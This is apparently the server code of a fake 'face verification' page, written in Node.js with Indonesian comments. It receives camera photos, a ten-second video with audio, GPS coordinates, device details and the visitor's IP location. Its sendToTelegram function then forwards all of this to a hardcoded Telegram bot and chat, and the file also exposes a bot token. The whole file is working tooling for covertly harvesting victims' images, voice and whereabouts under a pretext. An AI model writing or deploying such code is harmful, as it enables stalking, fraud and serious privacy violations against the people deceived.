const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log('========================================');

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));

// ============================================
// 📍 GET LOCATION DARI IP
// ============================================
async function getLocationDetails(ip) {
    try {
        const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
        if (!cleanIp) return null;

        const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,lat,lon,isp`);
        const data = await res.json();

        if (data.status === 'success') {
            return {
                fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
                latitude: data.lat || 0,
                longitude: data.lon || 0,
                provider: data.isp ? data.isp.replace('PT ', '') : '-',
                googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`
            };
        }
        return null;
    } catch (e) {
        console.error('Geolocation error:', e.message);
        return null;
    }
}

// ============================================
// 📤 SEND 1 PESAN LENGKAP KE TELEGRAM
// ============================================
async function sendToTelegram(data) {
    try {
        const { frontPhoto, backPhoto, video, gps, device, ip, timestamp, phone, locationData } = data;
        const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        console.log('📤 Sending 1 complete message to Telegram...');

        // ===== BUAT CAPTION LENGKAP =====
        let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
        caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
        caption += `🕒 *Waktu:* ${time}\n\n`;

        // Device Info
        if (device) {
            caption += `📱 *Device:* ${device.brand || 'Tidak diketahui'} ${device.model || ''}\n`;
            caption += `💻 *OS:* ${device.os || 'Tidak diketahui'}\n`;
            caption += `🌐 *Browser:* ${device.browser || 'Tidak diketahui'}\n\n`;
        }

        // Lokasi dari IP
        if (locationData) {
            caption += `📍 *Lokasi (IP):* ${locationData.fullLocation}\n`;
            caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
        }

        // GPS
        if (gps && gps.latitude && gps.longitude) {
            caption += `📍 *GPS:* ${gps.latitude}, ${gps.longitude}\n`;
            caption += `🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
        }

        caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
        caption += `📹 *Video + Audio:* 10 detik`;

        // ===== KIRIM 1 PESAN DENGAN FOTO + VIDEO =====
        // Kirim foto depan sebagai cover
        let photoBuffer = null;
        if (frontPhoto) {
            photoBuffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
        } else if (backPhoto) {
            photoBuffer = Buffer.from(backPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
        }

        // Kirim album (foto + video dalam 1 pesan)
        // Cara: kirim foto dulu, lalu video sebagai reply
        let messageId = null;

        // 1. Kirim FOTO
        if (photoBuffer) {
            const formPhoto = new FormData();
            formPhoto.append('chat_id', CHAT_ID);
            formPhoto.append('caption', caption);
            formPhoto.append('photo', photoBuffer, {
                filename: `foto_${Date.now()}.jpg`,
                contentType: 'image/jpeg'
            });

            const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formPhoto
            });
            const photoResult = await photoResponse.json();
            if (photoResult.ok) {
                messageId = photoResult.result.message_id;
                console.log('✅ Photo sent, message_id:', messageId);
            }
        }

        // 2. Kirim VIDEO (reply ke foto)
        if (video) {
            const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
            const videoBuffer = Buffer.from(videoBase64, 'base64');

            const formVideo = new FormData();
            formVideo.append('chat_id', CHAT_ID);
            formVideo.append('caption', `📹 *Video Verifikasi 10 Detik*\nUser: ${phone || 'Tidak diketahui'}`);
            formVideo.append('video', videoBuffer, {
                filename: `video_${Date.now()}.mp4`,
                contentType: 'video/mp4'
            });

            // Reply ke foto
            if (messageId) {
                formVideo.append('reply_to_message_id', messageId);
            }

            const videoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formVideo
            });
            const videoResult = await videoResponse.json();
            console.log('📹 Video send result:', videoResult.ok ? '✅ Success' : '❌ Failed');
        }

        // 3. Kirim GPS Location
        if (gps && gps.latitude && gps.longitude) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: gps.latitude,
                    longitude: gps.longitude
                })
            });
        }

        return true;
    } catch (err) {
        console.error('❌ Send error:', err);
        return false;
    }
}

// ============================================
// ✅ VERIFY ENDPOINT
// ============================================
app.post('/verify', async (req, res) => {
    console.log('📸 ===== NEW VERIFICATION =====');
    console.log('📸 Time:', new Date().toISOString());

    try {
        const { frontPhoto, backPhoto, video, gps, device, timestamp, phone } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

        console.log(`📸 Front Photo: ${frontPhoto ? 'YES' : 'NO'}`);
        console.log(`📸 Back Photo: ${backPhoto ? 'YES' : 'NO'}`);
        console.log(`📹 Video: ${video ? 'YES' : 'NO'}`);
        console.log(`📱 GPS:`, gps);
        console.log(`📱 Device:`, device);

        const locationData = await getLocationDetails(ip);

        const result = await sendToTelegram({
            frontPhoto,
            backPhoto,
            video,
            gps,
            device,
            ip,
            timestamp: timestamp || new Date().toISOString(),
            phone: phone || `User_${Date.now().toString().slice(-6)}`,
            locationData
        });

        if (result) {
            console.log('✅ Success!');
            res.json({ success: true });
        } else {
            console.log('❌ Failed');
            res.json({ success: false, error: 'Telegram error' });
        }

    } catch (err) {
        console.error('❌ Error:', err);
        res.json({ success: false, error: err.message });
    }
});

// ============================================
// 🧪 TEST
// ============================================
app.get('/test', async (req, res) => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const data = await response.json();
        res.json(data);
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
